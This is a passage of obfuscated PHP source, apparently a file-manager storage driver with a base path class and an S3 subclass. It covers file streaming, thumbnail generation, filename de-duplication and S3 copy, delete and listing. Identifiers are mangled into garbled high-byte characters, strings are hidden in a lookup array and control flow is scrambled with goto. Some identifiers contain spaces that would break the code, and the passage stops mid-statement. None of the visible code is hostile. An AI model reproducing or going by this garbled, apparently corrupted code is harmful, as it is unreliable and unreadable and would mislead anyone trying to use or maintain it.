açö¾§÷˜á: if ($bôŠä‰õ¤è) { $açìÍ–•Ã = intval(1000 * 1000 * ($C“ÔªîŸ« / $bôŠä‰õ¤è)); } while ($e†•¸øí‹ì <= $A—æ™ƒÃÇŒ) { $E·–ƒÆ”¨‹ = timeFloat(); check_abort(); $aƒº‚†×Êë = $A—æ™ƒÃÇŒ - $e†•¸øí‹ì + 1; if ($aƒº‚†×Êë <= $C“ÔªîŸ«) { $C“ÔªîŸ« = $aƒº‚†×Êë; } echo $this->fileSubstr($b²Äâ˜¹¤”, $e†•¸øí‹ì, $C“ÔªîŸ«); $e†•¸øí‹ì += $C“ÔªîŸ«; if ($C“ÔªîŸ« == $aƒº‚†×Êë) { $e†•¸øí‹ì = $A—æ™ƒÃÇŒ + 1; } if ($açìÍ–•Ã) { $CÒÓÏøĞóè = intval(1000 * 1000 * (timeFloat() - $E·–ƒÆ”¨‹)); $c¸Óòšôãİ = $açìÍ–•Ã - $CÒÓÏøĞóè; if ($c¸Óòšôãİ > 5) { usleep($c¸Óòšôãİ); } } } goto C¼®¥î‡·‘; C…ÓÌ÷à†ê: $cší“¥ãŞá = $dî‚¿¤¡Á[116] . $cší“¥ãŞá . $dî‚¿¤¡Á[122] . $cší“¥ãŞá; if ($a²•”óîÊº) { header($dî‚¿¤¡Á[123]); header($dî‚¿¤¡Á[124] . $cší“¥ãŞá); } else { header($dî‚¿¤¡Á[125] . $cší“¥ãŞá); } header($dî‚¿¤¡Á[126] . gmdate($dî‚¿¤¡Á[110], time() + 3600 * 24 * 30) . $dî‚¿¤¡Á[127]); goto a…ñÊ…µ·’; e‚ÜòØö‰: $E§‰ëôà¥Ú = $dºÀƒ®ğÓ—[$dî‚¿¤¡Á[78]]; $Dƒ‰¨µ£·§ = gmdate($dî‚¿¤¡Á[110], $dºÀƒ®ğÓ—[$dî‚¿¤¡Á[84]]); $d›³ÂÉ×‚¼ = $FµŸöö±Ú¥ ? $FµŸöö±Ú¥ : $this->iconvApp($dºÀƒ®ğÓ—[$dî‚¿¤¡Á[28]]); goto F¶¥ğŒ°Ğ„; a…ñÊ…µ·’: header($dî‚¿¤¡Á[128]); header($dî‚¿¤¡Á[129]); header($dî‚¿¤¡Á[130]); goto C¥‚¨Ü ù; F¿õšéç‚ñ: $E¡”¶ İÛ = get_file_mime($e‘ñ¥£“°ê); if (strstr($E¡”¶ İÛ, $dî‚¿¤¡Á[117])) { $E¡”¶ İÛ = $E¡”¶ İÛ . $dî‚¿¤¡Á[118]; } if ($a²•”óîÊº === !1 && !mime_support($E¡”¶ İÛ)) { $a²•”óîÊº = !0; $E¡”¶ İÛ = $dî‚¿¤¡Á[119]; } goto CÏ±‚Œƒì­; C¼®¥î‡·‘: } public function fileOutServer($E²ğÇöÆ“á, $aİÌØÜ«ë• = false, $eÁÅß„—“ê = false, $C¦ Å•†æ = '') { $this->fileOut($E²ğÇöÆ“á, $aİÌØÜ«ë•, $eÁÅß„—“ê, $C¦ Å•†æ); } public function fileOutLink($E‚¸ºòÛ¥â) { header($_SERVER[ä°„ä°º][159] . $E‚¸ºòÛ¥â); die; } public function cacheMethod($bÅ˜‰äİó‰, $F¥±¢È°–‰, $f‹Ü‰Ç± = null) { goto dˆìÛÄˆğ¾; cƒÆ¥Ç†š: if (!is_null($f‹Ü‰Ç±)) { $d÷§§ô‚²´[$bÏ®»ø°ô] = $f‹Ü‰Ç±; return; } $cæğ¹ç»ê‘ = isset($d÷§§ô‚²´[$bÏ®»ø°ô]) ? $d÷§§ô‚²´[$bÏ®»ø°ô] : null; if (!is_null($cæğ¹ç»ê‘)) { return $cæğ¹ç»ê‘; } goto B‡ù³ÆÓö; B‡ù³ÆÓö: $cæğ¹ç»ê‘ = $this->{$bÅ˜‰äİó‰}($F¥±¢È°–‰); $d÷§§ô‚²´[$bÏ®»ø°ô] = $cæğ¹ç»ê‘; return $cæğ¹ç»ê‘; goto bæ½Ö©‹Û£; dˆìÛÄˆğ¾: $D³“Âê‘¡ä =& $_SERVER[ä°„ä°º]; static $d÷§§ô‚²´ = array(); $a¥„Š¼Œ‚À = $F¥±¢È°–‰ ? ltrim($this->getPathOuter($F¥±¢È°–‰), $D³“Âê‘¡ä[8]) : $F¥±¢È°–‰; goto Dåçì¿Ü‹¾; Dåçì¿Ü‹¾: $bÏ®»ø°ô = $D³“Âê‘¡ä[160] . $bÅ˜‰äİó‰ . $D³“Âê‘¡ä[161] . rtrim($a¥„Š¼Œ‚À, $D³“Âê‘¡ä[8]); if (is_null($bÅ˜‰äİó‰)) { $d÷§§ô‚²´ = array(); return; } if (is_null($F¥±¢È°–‰)) { unset($d÷§§ô‚²´[$bÏ®»ø°ô]); return; } goto cƒÆ¥Ç†š; bæ½Ö©‹Û£: } public function fileOutImage($B£•¤Ôó‡«, $a¦¼ë‡• = 250) { goto BÈ‚ƒË‡¥; BÈ‚ƒË‡¥: $e´İªñÉˆ =& $_SERVER[ä°„ä°º]; set_timeout(); if (substr($B£•¤Ôó‡«, 0, 4) == $e´İªñÉˆ[147]) { $this->fileOutLink($B£•¤Ôó‡«); } goto cå°Úí×°¥; AèîŠ¯¿³¥: $FšÒÔ‡ÉŒ = "{$a¬ó‹™³ÖŞ}\x5f{$a¦¼ë‡•}\56\x70\156\x67"; if (!($E™ñï©¾‘Ç = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $e´İªñÉˆ[172]))) { $F«œÛÕòÒ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $e´İªñÉˆ[173]); } else { $F«œÛÕòÒ = KodIO::make($E™ñï©¾‘Ç); } if ($E™ñï©¾‘Ç = IO::fileNameExist($F«œÛÕòÒ, $FšÒÔ‡ÉŒ)) { $f”°ã„Üõõ = KodIO::make($E™ñï©¾‘Ç); return IO::fileOut($f”°ã„Üõõ, !1, $CÃë¾È§‡); } goto Cà–”½â‚; cå°Úí×°¥: $dí“Ë‚ãØ = $this->info($B£•¤Ôó‡«); $CÃë¾È§‡ = $dí“Ë‚ãØ[$e´İªñÉˆ[28]]; $bó–‰¨ÃÇ¹ = !1; goto aİß¸Øõ; aˆ¢§†¾æ: del_file($f”°ã„Üõõ); IO::fileOut($aéòÆ®ÓÌ); goto EÔõÛ‘šîÔ; Cà–”½â‚: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $f”°ã„Üõõ = DATA_THUMB . $FšÒÔ‡ÉŒ; del_file($f”°ã„Üõõ); goto cäº­è÷ŒÁ; cäº­è÷ŒÁ: if (!@file_exists($f”°ã„Üõõ)) { $E³—ŸˆïŸá = TEMP_FILES; if (!is_dir($E³—ŸˆïŸá)) { mk_dir($E³—ŸˆïŸá); } $fŒ‹Ææ¥ÁÁ = $E³—ŸˆïŸá . $a¬ó‹™³ÖŞ . $e´İªñÉˆ[95] . $dí“Ë‚ãØ[$e´İªñÉˆ[168]]; if (!@file_exists($fŒ‹Ææ¥ÁÁ)) { $fŒ‹Ææ¥ÁÁ = $this->download($B£•¤Ôó‡«, $fŒ‹Ææ¥ÁÁ); } ImageThumb::createThumb($fŒ‹Ææ¥ÁÁ, $f”°ã„Üõõ, $a¦¼ë‡•, $a¦¼ë‡• * 10); } if (!file_exists($f”°ã„Üõõ) || filesize($f”°ã„Üõõ) < 100) { return @file_exists($fŒ‹Ææ¥ÁÁ) ? IO::fileOut($fŒ‹Ææ¥ÁÁ) : $this->fileOut($B£•¤Ôó‡«); } if (!($aéòÆ®ÓÌ = IO::move($f”°ã„Üõõ, $F«œÛÕòÒ))) { return IO::fileOut($f”°ã„Üõõ); } goto aˆ¢§†¾æ; aİß¸Øõ: if (isset($GLOBALS[$e´İªñÉˆ[162]]) && $GLOBALS[$e´İªñÉˆ[162]][$e´İªñÉˆ[76]] == $dí“Ë‚ãØ[$e´İªñÉˆ[76]]) { $BÓñ ƒŒ‘Û = $GLOBALS[$e´İªñÉˆ[162]][$e´İªñÉˆ[163]]; if (!$dí“Ë‚ãØ[$e´İªñÉˆ[164]]) { $dí“Ë‚ãØ[$e´İªñÉˆ[164]] = $GLOBALS[$e´İªñÉˆ[162]]; } if (isset($BÓñ ƒŒ‘Û[$e´İªñÉˆ[165]])) { if ($BÓñ ƒŒ‘Û[$e´İªñÉˆ[165]] <= $a¦¼ë‡• && $BÓñ ƒŒ‘Û[$e´İªñÉˆ[166]] <= $a¦¼ë‡•) { $bó–‰¨ÃÇ¹ = !0; } } $CÃë¾È§‡ = $dí“Ë‚ãØ[$e´İªñÉˆ[164]][$e´İªñÉˆ[28]]; } if ($dí“Ë‚ãØ[$e´İªñÉˆ[78]] <= 1024 * 50 || $bó–‰¨ÃÇ¹ || !function_exists($e´İªñÉˆ[167]) || $dí“Ë‚ãØ[$e´İªñÉˆ[168]] == $e´İªñÉˆ[169]) { return $this->fileOut($B£•¤Ôó‡«, !1, $CÃë¾È§‡); } if (isset($dí“Ë‚ãØ[$e´İªñÉˆ[164]][$e´İªñÉˆ[170]])) { $a¬ó‹™³ÖŞ = $dí“Ë‚ãØ[$e´İªñÉˆ[164]][$e´İªñÉˆ[170]]; } else { if (isset($dí“Ë‚ãØ[$e´İªñÉˆ[164]][$e´İªñÉˆ[171]])) { $a¬ó‹™³ÖŞ = $dí“Ë‚ãØ[$e´İªñÉˆ[164]][$e´İªñÉˆ[171]]; } else { $a¬ó‹™³ÖŞ = md5("{$dí“Ë‚ãØ[$e´İªñÉˆ[28]]}\x5f{$dí“Ë‚ãØ[$e´İªñÉˆ[76]]}\137{$dí“Ë‚ãØ[$e´İªñÉˆ[78]]}"); } } goto AèîŠ¯¿³¥; EÔõÛ‘šîÔ: } public function fileOutImageServer($Aæ„‘´à‡Õ, $DãÉ¸‘§‚ = 250) { $this->fileOutImage($Aæ„‘´à‡Õ, $DãÉ¸‘§‚); } public function fileNameAuto($c‘å½ˆ¨ë, $FîÈ‹œÕ¡ò, $bÅõ´º÷Ş„ = REPEAT_RENAME, $Cï¹¬Œ‡Š´ = false) { goto f•Åòå³ˆ; f•Åòå³ˆ: $a…“ñæ‡æ =& $_SERVER[ä°„ä°º]; $eøéÊŠëâã = $c‘å½ˆ¨ë === $a…“ñæ‡æ[33] ? $FîÈ‹œÕ¡ò : rtrim($c‘å½ˆ¨ë, $a…“ñæ‡æ[8]) . $a…“ñæ‡æ[8] . $FîÈ‹œÕ¡ò; if ($bÅõ´º÷Ş„ == REPEAT_REPLACE || !$this->exist($eøéÊŠëâã) || $Cï¹¬Œ‡Š´ && $bÅõ´º÷Ş„ != REPEAT_RENAME_FOLDER) { return $FîÈ‹œÕ¡ò; } goto CŠ²Ì¸¹; eƒó¨ÈÙ™À: while ($this->exist(rtrim($c‘å½ˆ¨ë, $a…“ñæ‡æ[8]) . $a…“ñæ‡æ[8] . $A›²ŠĞí½’)) { $A›²ŠĞí½’ = $D½ÏÖ¤†Ò . "\50{$CÇ‘Ã×œİ}\x29{$b®”õ²õ}"; $CÇ‘Ã×œİ++; } return $A›²ŠĞí½’; goto Bö —·¦îÜ; CŠ²Ì¸¹: if ($bÅõ´º÷Ş„ == REPEAT_SKIP) { return !1; } $b®”õ²õ = $a…“ñæ‡æ[95] . get_path_ext($FîÈ‹œÕ¡ò); $b®”õ²õ = $b®”õ²õ == $a…“ñæ‡æ[95] || $Cï¹¬Œ‡Š´ ? $a…“ñæ‡æ[33] : $b®”õ²õ; goto cÌë·÷ÃÙ; cÌë·÷ÃÙ: $CÇ‘Ã×œİ = 1; $D½ÏÖ¤†Ò = substr($FîÈ‹œÕ¡ò, 0, strlen($FîÈ‹œÕ¡ò) - strlen($b®”õ²õ)); $A›²ŠĞí½’ = $D½ÏÖ¤†Ò . "\x28{$CÇ‘Ã×œİ}\x29{$b®”õ²õ}"; goto eƒó¨ÈÙ™À; Bö —·¦îÜ: } private function fileNameAutoList($fèÍÜ…ŠÛ, $D¿Ê‘òÓ‹Â, $fœ—‘éõê = false) { goto F×ÎÚ¢ˆÍå; CíÂÍõ‘çš: $d´´™Í½÷Ê = array_to_keyvalue($A÷î¸¹ÒÌ, $EÆÙ‘áÓ¯[33], $EÆÙ‘áÓ¯[28]); $dŠ¦ù™Ôçƒ = $EÆÙ‘áÓ¯[95] . get_path_ext($D¿Ê‘òÓ‹Â); $dŠ¦ù™Ôçƒ = $dŠ¦ù™Ôçƒ == $EÆÙ‘áÓ¯[95] || $fœ—‘éõê ? $EÆÙ‘áÓ¯[33] : $dŠ¦ù™Ôçƒ; goto fØßĞ‚Ó‚Ë; cø­§›ê: return $Dã³¢Ï¾Ç¸; goto d›ŒÉõîÊ±; fØßĞ‚Ó‚Ë: $c¦öòÙïà÷ = substr($D¿Ê‘òÓ‹Â, 0, strlen($D¿Ê‘òÓ‹Â) - strlen($dŠ¦ù™Ôçƒ)); $Dã³¢Ï¾Ç¸ = $c¦öòÙïà÷ . "\x28\60\x29{$dŠ¦ù™Ôçƒ}"; for ($D‹ê¾ó±å = 1; $D‹ê¾ó±å <= count($d´´™Í½÷Ê) + 1; $D‹ê¾ó±å++) { $Dã³¢Ï¾Ç¸ = $c¦öòÙïà÷ . "\50{$D‹ê¾ó±å}\51{$dŠ¦ù™Ôçƒ}"; if (!in_array_not_case($Dã³¢Ï¾Ç¸, $d´´™Í½÷Ê)) { return $Dã³¢Ï¾Ç¸; } } goto cø­§›ê; F×ÎÚ¢ˆÍå: $EÆÙ‘áÓ¯ =& $_SERVER[ä°„ä°º]; $A÷î¸¹ÒÌ = $this->listPath($fèÍÜ…ŠÛ, !0); $A÷î¸¹ÒÌ = array_merge($A÷î¸¹ÒÌ[$EÆÙ‘áÓ¯[75]], $A÷î¸¹ÒÌ[$EÆÙ‘áÓ¯[74]]); goto CíÂÍõ‘çš; d›ŒÉõîÊ±: } public function listAllFiles($eÖ¶Ì»ãŒƒ, $c‘à‚ìˆÖª, $AèŸ¡ß®ğ„ = array()) { goto DĞÓ•³×—‘; F™ƒğ»¦ï: foreach (array_unique($b‹ë’•–šÀ) as $e¢ñÙÄ‚©‰) { $d–æ°éÔÌµ = array($B¬Ã‚ŠŞÆ£[76] => $this->getPathOuter($B¬Ã‚ŠŞÆ£[8] . $eÖ¶Ì»ãŒƒ . $B¬Ã‚ŠŞÆ£[8] . $e¢ñÙÄ‚©‰), $B¬Ã‚ŠŞÆ£[77] => 1, $B¬Ã‚ŠŞÆ£[78] => 0); if (substr($e¢ñÙÄ‚©‰, -1) != $B¬Ã‚ŠŞÆ£[8]) { $d–æ°éÔÌµ[$B¬Ã‚ŠŞÆ£[77]] = 0; $F¡²¹éÔˆÄ = $this->getPath($eÖ¶Ì»ãŒƒ . $B¬Ã‚ŠŞÆ£[8] . $e¢ñÙÄ‚©‰); $d–æ°éÔÌµ[$B¬Ã‚ŠŞÆ£[78]] = isset($AèŸ¡ß®ğ„[$F¡²¹éÔˆÄ]) ? $AèŸ¡ß®ğ„[$F¡²¹éÔˆÄ] : $this->size($F¡²¹éÔˆÄ); } $Eï¸–‹ô‘[] = $d–æ°éÔÌµ; } return $Eï¸–‹ô‘; goto Fğ…ÀÜÑæ; b‡È¿Ë¬: $eÖ¶Ì»ãŒƒ = trim($eÖ¶Ì»ãŒƒ, $B¬Ã‚ŠŞÆ£[8]); foreach ($c‘à‚ìˆÖª as $e¢ñÙÄ‚©‰) { $D¥çÚ÷ÑæÕ = ltrim(substr(trim($e¢ñÙÄ‚©‰, $B¬Ã‚ŠŞÆ£[8]), strlen($eÖ¶Ì»ãŒƒ)), $B¬Ã‚ŠŞÆ£[8]); $b‹ë’•–šÀ = array_merge($b‹ë’•–šÀ, $this->slicePath($D¥çÚ÷ÑæÕ)); } $Eï¸–‹ô‘ = array(); goto F™ƒğ»¦ï; DĞÓ•³×—‘: $B¬Ã‚ŠŞÆ£ =& $_SERVER[ä°„ä°º]; if (empty($c‘à‚ìˆÖª)) { return array(); } $b‹ë’•–šÀ = array(); goto b‡È¿Ë¬; Fğ…ÀÜÑæ: } public function slicePath($a‚›±ÔÇ³) { $A“Úƒ±Ê =& $_SERVER[ä°„ä°º]; $E³ ¨×İ = explode($A“Úƒ±Ê[8], trim($a‚›±ÔÇ³, $A“Úƒ±Ê[8])); $Cğ…ê£¾ = 0; do { ++$Cğ…ê£¾; $E’Ú”Ï·ï[] = implode($A“Úƒ±Ê[8], array_slice($E³ ¨×İ, 0, $Cğ…ê£¾)) . $A“Úƒ±Ê[8]; } while ($Cğ…ê£¾ < count($E³ ¨×İ)); $E’Ú”Ï·ï[count($E³ ¨×İ) - 1] = $a‚›±ÔÇ³; return $E’Ú”Ï·ï; } public function getHost() { $cÀô›š¤ö» =& $_SERVER[ä°„ä°º]; $eÒ‚——†˜ì = parse_url(trim($this->domain, $cÀô›š¤ö»[8])); $bô…ñ»ñ¢¢ = isset($eÒ‚——†˜ì[$cÀô›š¤ö»[174]]) ? $eÒ‚——†˜ì[$cÀô›š¤ö»[174]] : http_type(); $D«ï’¬Ú¢ = isset($eÒ‚——†˜ì[$cÀô›š¤ö»[175]]) ? $eÒ‚——†˜ì[$cÀô›š¤ö»[175]] : $eÒ‚——†˜ì[$cÀô›š¤ö»[76]]; if (isset($eÒ‚——†˜ì[$cÀô›š¤ö»[176]])) { $D«ï’¬Ú¢ .= $cÀô›š¤ö»[4] . $eÒ‚——†˜ì[$cÀô›š¤ö»[176]]; } return $bô…ñ»ñ¢¢ . $cÀô›š¤ö»[177] . $D«ï’¬Ú¢; } public function pathEncode($aö¶§îÇÌé) { $C˜Ğœ·òÚ =& $_SERVER[ä°„ä°º]; return str_replace($C˜Ğœ·òÚ[178], $C˜Ğœ·òÚ[8], rawurlencode($aö¶§îÇÌé)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($B†¾ï§œâ§) { set_timeout(); require_once SDK_DIR . $_SERVER[ä°„ä°º][179]; parent::__construct(); $this->_init($B†¾ï§œâ§); } public function _init($dœ“‚ƒ¨£Ò) { foreach ($dœ“‚ƒ¨£Ò as $c›—©ŸñÜÎ => $aìíÍÈÃˆ) { if (isset($this->{$c›—©ŸñÜÎ})) { $this->{$c›—©ŸñÜÎ} = $aìíÍÈÃˆ; } } $this->endpoint = $dœ“‚ƒ¨£Ò[$_SERVER[ä°„ä°º][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($C¾à¼—×íá = "\x76\x34") { $this->signVer = $C¾à¼—×íá; $this->client->setSignatureVersion($C¾à¼—×íá); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto AÏ‡†ëé¨; AÏ‡†ëé¨: $b¾ğÔ¬„¬ =& $_SERVER[ä°„ä°º]; $dÅˆÒŠ¥“ = $this->getBucketCors(); if (!$dÅˆÒŠ¥“ || !is_array($dÅˆÒŠ¥“)) { return !1; } goto f¬“Ó¼àä«; f¬“Ó¼àä«: if ($dÅˆÒŠ¥“[$b¾ğÔ¬„¬[181]] != $b¾ğÔ¬„¬[182] || $dÅˆÒŠ¥“[$b¾ğÔ¬„¬[183]] != $b¾ğÔ¬„¬[182]) { return !1; } $AêšªÊÂ£ó = array_map($b¾ğÔ¬„¬[184], $dÅˆÒŠ¥“[$b¾ğÔ¬„¬[185]]); if (!is_array($AêšªÊÂ£ó)) { $AêšªÊÂ£ó = array(); } goto Fï‹½Îˆ˜µ; Fï‹½Îˆ˜µ: $E£œ–ö”Òƒ = array($b¾ğÔ¬„¬[186], $b¾ğÔ¬„¬[187], $b¾ğÔ¬„¬[188], $b¾ğÔ¬„¬[189], $b¾ğÔ¬„¬[190]); $Ağˆƒñ¼Ò = array_diff($E£œ–ö”Òƒ, $AêšªÊÂ£ó); return empty($Ağˆƒñ¼Ò); goto EòïÚø°ğ†; EòïÚø°ğ†: } public function mkfile($dğÕš•¶Èä, $FÅöà„‚Ğ = '', $f­·ÜİÅğ = REPEAT_RENAME) { $c·İˆœÖ’õ = $this->setContent($dğÕš•¶Èä, $FÅöà„‚Ğ); if ($c·İˆœÖ’õ !== !1) { return $this->getPathOuter($dğÕš•¶Èä); } return !1; } public function mkdir($E¼¿‘‚®×à, $c”ƒ»œè¤š = REPEAT_SKIP) { $Cï“›¯® =& $_SERVER[ä°„ä°º]; if (empty($E¼¿‘‚®×à) && $E¼¿‘‚®×à !== $Cï“›¯®[191]) { return !1; } if ($this->_isFolder($E¼¿‘‚®×à)) { return $this->getPathOuter($E¼¿‘‚®×à); } $Eš¾ºÏ‹Î = $this->setContent($E¼¿‘‚®×à, $Cï“›¯®[33], !0); if ($Eš¾ºÏ‹Î !== !1) { return $this->getPathOuter($E¼¿‘‚®×à); } return !1; } public function copyFile($EŒç­½©¢, $câã©‚®Î¤, $dä¿Š‘²ËÂ = array()) { $eÀ†óßâ“ä =& $_SERVER[ä°„ä°º]; $F¤ì½•àø… = $this->objectMeta($EŒç­½©¢); if (!$F¤ì½•àø…) { return !1; } if ($F¤ì½•àø…[$eÀ†óßâ“ä[78]] <= 1024 * 1024 * 200) { $D¨©ìñÛÔ» = $this->client->copyObject($this->bucket, $EŒç­½©¢, $this->bucket, $câã©‚®Î¤, $eÀ†óßâ“ä[192], $dä¿Š‘²ËÂ); } else { $D¨©ìñÛÔ» = $this->client->multiCopyObject($this->bucket, $EŒç­½©¢, $this->bucket, $câã©‚®Î¤, $dä¿Š‘²ËÂ); } $D¨©ìñÛÔ» = $D¨©ìñÛÔ» ? $this->getPathOuter($câã©‚®Î¤) : !1; return $D¨©ìñÛÔ»; } public function moveFile($A½áƒˆîÁ, $EºŠÜâ°ó) { if ($this->copyFile($A½áƒˆîÁ, $EºŠÜâ°ó)) { $this->delFile($A½áƒˆîÁ); return $this->getPathOuter($EºŠÜâ°ó); } return !1; } public function delFile($D½àó½£Æ÷) { return $this->client->deleteObject($this->bucket, $D½àó½£Æ÷); } public function delFolder($a¹ê˜ªïé‹) { goto EÌÕÆÖÕÃâ; aí™­ë: $BÔÄ„Æ•‘ = $this->fileList($a¹ê˜ªïé‹); $this->listItemCache = !0; $c·¹»—ñ›‹ = trim($a¹ê˜ªïé‹, $Cß§Íœè‰±[8]) . $Cß§Íœè‰±[8]; goto b¾èÜÁ³Ÿâ; b¾èÜÁ³Ÿâ: if (!empty($a¹ê˜ªïé‹) && $a¹ê˜ªïé‹ !== $Cß§Íœè‰±[191] && !in_array($c·¹»—ñ›‹, $BÔÄ„Æ•‘[$Cß§Íœè‰±[75]])) { $BÔÄ„Æ•‘[$Cß§Íœè‰±[75]][] = $c·¹»—ñ›‹; } $f“¶Î§‘ƒº = $this->delByBatch($BÔÄ„Æ•‘[$Cß§Íœè‰±[74]]); if (!$f“¶Î§‘ƒº) { return !1; } goto bßùÎª‰Ÿµ; bßùÎª‰Ÿµ: $f“¶Î§‘ƒº = $this->delByBatch($BÔÄ„Æ•‘[$Cß§Íœè‰±[75]]); if (!$f“¶Î§‘ƒº) { return !1; } return $this->delFile($c·¹»—ñ›‹); goto bñ§³î…ƒù; EÌÕÆÖÕÃâ: $Cß§Íœè‰± =& $_SERVER[ä°„ä°º]; if (!$this->exist($a¹ê˜ªïé‹)) { return !0; } $this->listItemCache = !1; goto aí™­ë; bñ§³î…ƒù: } private function delByBatch($CÓé˜ƒÂÊ) { foreach (array_chunk($CÓé˜ƒÂÊ, 1000) as $bÎ¶ßâ“õÍ) { $b»‡å„©¯ß = $this->client->deleteObjects($this->bucket, $bÎ¶ßâ“õÍ); if (!$b»‡å„©¯ß) { return !1; } } return !0; } public function rename($FÔæ‰†ôÃñ, $fã§ŞïÆ“) { return $this->renameObject($FÔæ‰†ôÃñ, $fã§ŞïÆ“); } public function listPath($a‡’óµ‡œ±, $c›÷°ºä¶¼ = false) { $BµÎ½Ï±¹Û =& $_SERVER[ä°„ä°º]; $F¦…öÃß¾œ = $this->fileList($a‡’óµ‡œ±, $BµÎ½Ï±¹Û[8], !0); foreach ($F¦…öÃß¾œ[$BµÎ½Ï±¹Û[75]] as $FÎË‚’á¯° => $aˆä×¥Ùß) { $F¦…öÃß¾œ[$BµÎ½Ï±¹Û[75]][$FÎË‚’á¯°] = $this->folderInfo($aˆä×¥Ùß, $c›÷°ºä¶¼); } foreach ($F¦…öÃß¾œ[$BµÎ½Ï±¹Û[74]] as $FÎË‚’á¯° => $aˆä×¥Ùß) { $F¦…öÃß¾œ[$BµÎ½Ï±¹Û[74]][$FÎË‚’á¯°] = $this->fileInfo($aˆä×¥Ùß[$BµÎ½Ï±¹Û[28]], $c›÷°ºä¶¼, $aˆä×¥Ùß); } return $F¦…öÃß¾œ; } private function fileInfo($fÚËØ‹‰¡, $EÜ ä÷ëÈš = false, $fÓ…ÃŞª¥· = array()) { goto fš•–™ğ‹Ø; c¾İóì‹°æ: $AÀÒ›¡‘Û®[$DóÊ™Ô÷ŠÔ[194]] = $AÀÒ›¡‘Û®[$DóÊ™Ô÷ŠÔ[84]] = 0; $AÀÒ›¡‘Û®[$DóÊ™Ô÷ŠÔ[195]] = $AÀÒ›¡‘Û®[$DóÊ™Ô÷ŠÔ[196]] = !0; if (empty($fÓ…ÃŞª¥·)) { $fÓ…ÃŞª¥· = $this->objectMeta($fÚËØ‹‰¡); if (!$fÓ…ÃŞª¥·) { return $AÀÒ›¡‘Û®; } } goto FÔë§£º„­; fš•–™ğ‹Ø: $DóÊ™Ô÷ŠÔ =& $_SERVER[ä°„ä°º]; $AÀÒ›¡‘Û® = array($DóÊ™Ô÷ŠÔ[28] => $this->pathThis($fÚËØ‹‰¡), $DóÊ™Ô÷ŠÔ[76] => $this->getPathOuter($fÚËØ‹‰¡), $DóÊ™Ô÷ŠÔ[29] => $DóÊ™Ô÷ŠÔ[193], $DóÊ™Ô÷ŠÔ[168] => $this->ext($fÚËØ‹‰¡), $DóÊ™Ô÷ŠÔ[78] => isset($fÓ…ÃŞª¥·[$DóÊ™Ô÷ŠÔ[78]]) ? $fÓ…ÃŞª¥·[$DóÊ™Ô÷ŠÔ[78]] : 0); if ($EÜ ä÷ëÈš) { return $AÀÒ›¡‘Û®; } goto c¾İóì‹°æ; FÔë§£º„­: if (isset($fÓ…ÃŞª¥·[$DóÊ™Ô÷ŠÔ[197]])) { $AÀÒ›¡‘Û®[$DóÊ™Ô÷ŠÔ[84]] = $fÓ…ÃŞª¥·[$DóÊ™Ô÷ŠÔ[197]]; } if (isset($fÓ…ÃŞª¥·[$DóÊ™Ô÷ŠÔ[78]])) { $AÀÒ›¡‘Û®[$DóÊ™Ô÷ŠÔ[78]] = $fÓ…ÃŞª¥·[$DóÊ™Ô÷ŠÔ[78]]; } return $AÀÒ›¡‘Û®; goto EÏ‹¶ĞùáĞ; EÏ‹¶ĞùáĞ: } private function folderInfo($B·¸‰ù÷ïÍ, $Fõ½çßæÆ× = false) { goto DçŸ¨”Ù; DçŸ¨”Ù: $d·ÖÄºĞ±Ã =& $_SERVER[ä°„ä°º]; $F„ãö¢‹ºÎ = array($d·ÖÄºĞ±Ã[28] => $this->pathThis($B·¸‰ù÷ïÍ), $d·ÖÄºĞ±Ã[76] => $this->getPathOuter($d·ÖÄºĞ±Ã[8] . $B·¸‰ù÷ïÍ), $d·ÖÄºĞ±Ã[29] => $d·ÖÄºĞ±Ã[77]); if ($Fõ½çßæÆ×) { return $F„ãö¢‹ºÎ; } goto B¡ÏÕß«šƒ; cº´•àëŞÈ: return $F„ãö¢‹ºÎ; goto E¥ÊƒÈÍ; c›á¹åáÚ: $B·¸‰ù÷ïÍ = trim($B·¸‰ù÷ïÍ, $d·ÖÄºĞ±Ã[8]) . $d·ÖÄºĞ±Ã[8]; $c²Ğ£Šº‡Ä = $this->objectMeta($B·¸‰ù÷ïÍ); if (isset($c²Ğ£Šº‡Ä[$d·ÖÄºĞ±Ã[197]])) { $F„ãö¢‹ºÎ[$d·ÖÄºĞ±Ã[194]] = $c²Ğ£Šº‡Ä[$d·ÖÄºĞ±Ã[197]]; } goto cº´•àëŞÈ; B¡ÏÕß«šƒ: $F„ãö¢‹ºÎ[$d·ÖÄºĞ±Ã[194]] = $F„ãö¢‹ºÎ[$d·ÖÄºĞ±Ã[84]] = 0; $F„ãö¢‹ºÎ[$d·ÖÄºĞ±Ã[195]] = $F„ãö¢‹ºÎ[$d·ÖÄºĞ±Ã[196]] = !0; if ($B·¸‰ù÷ïÍ == $d·ÖÄºĞ±Ã[33]) { return $F„ãö¢‹ºÎ; } goto c›á¹åáÚ; E¥ÊƒÈÍ: } private function fileList($dÍËšÊ§Ë™, $d»Ü³ÅËå… = '', $Dò‹öíî¬™ = 0) { goto DÁÏâŒ‚Ê; CËó¼”«İ: foreach ($AÂÇ§·…±é[$F›À…áâ·[198]] as $bÇÍ­­«Í) { goto bÏßº¦¼µ ; eÑœÛ„ä·: $dÀëÊë×îÚ = $BÓ°»ŞŞªå == 0 && substr($B²¹ÛÎˆ¦, strlen($B²¹ÛÎˆ¦) - 1, 1) == $F›À…áâ·[8] ? !0 : !1; if ($E¯Û‰â‡ç) { $this->cacheMethod($F›À…áâ·[199], $B²¹ÛÎˆ¦, $dÀëÊë×îÚ); $this->cacheMethod($F›À…áâ·[200], $B²¹ÛÎˆ¦, $bÇÍ­­«Í); } if ($dÀëÊë×îÚ) { $E¯ö‘š„[] = $B²¹ÛÎˆ¦; continue; } goto Cá†÷ğ´Ô; bÏßº¦¼µ : $B²¹ÛÎˆ¦ = $bÇÍ­­«Í[$F›À…áâ·[28]]; if ($B²¹ÛÎˆ¦ == 